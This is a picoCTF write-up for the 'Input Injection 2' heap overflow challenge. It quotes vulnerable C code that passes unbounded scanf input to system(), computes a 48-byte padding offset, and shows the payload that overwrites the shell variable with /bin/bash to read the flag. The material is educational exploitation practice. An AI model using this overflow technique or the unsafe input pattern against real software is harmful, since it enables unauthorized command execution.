# Input Injection 2
## Pico CTF -- Medium


Input Injection 2 is a simple heap overflow challenge.

We are given the [compiled binary](vuln), as well as the [source code](vuln.c).

Notice, the program will execute the contents of the shell variable on the system. Notice also, there is limit to the size of our input. 

    char* username = malloc(28);
	char* shell = malloc(28);
	
	printf("username at %p\n", username);
    fflush(stdout);
	printf("shell at %p\n", shell);
    fflush(stdout);
	
	strcpy(shell, "/bin/pwd");
	
	printf("Enter username: ");
    fflush(stdout);
	scanf("%s", username); // We can supply an arbitrarily large username, to overwrite the value of the 'shell' variable.
	
	printf("Hello, %s. Your shell is %s.\n", username, shell);
	system(shell);
    fflush(stdout);

When we run the binary, we get the following information:

    └──╼ $nc amiable-citadel.picoctf.net 64413
    username at 0x13f342a0
    shell at 0x13f342d0


The distance between **username** and **shell** in memory is 0x13f342a0 - 0x13f342d0 = -48 bytes. Hence, we can construct a payload with 48 bytes of padding to fill the space in memory between **username** and **shell**, and then supply a new value for the shell variable.

    └──╼ $python3
    Python 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] on linux
    Type "help", "copyright", "credits" or "license" for more information.
    >>> 0x13f342a0 - 0x13f342d0
    -48
    >>> "A" * 48 + "/bin/bash"
    'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/bash'
    >>> 

We can supply this payload to the remote machine to get the flag.

    └──╼ $nc amiable-citadel.picoctf.net 64413
    username at 0x13f342a0
    shell at 0x13f342d0
    Enter username: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/bin/bash
    whoami
    ctf-player
    ls
    flag.txt
    cat flag.txt
    picoCTF{XXXXXXXXXXXXXXXXXXX}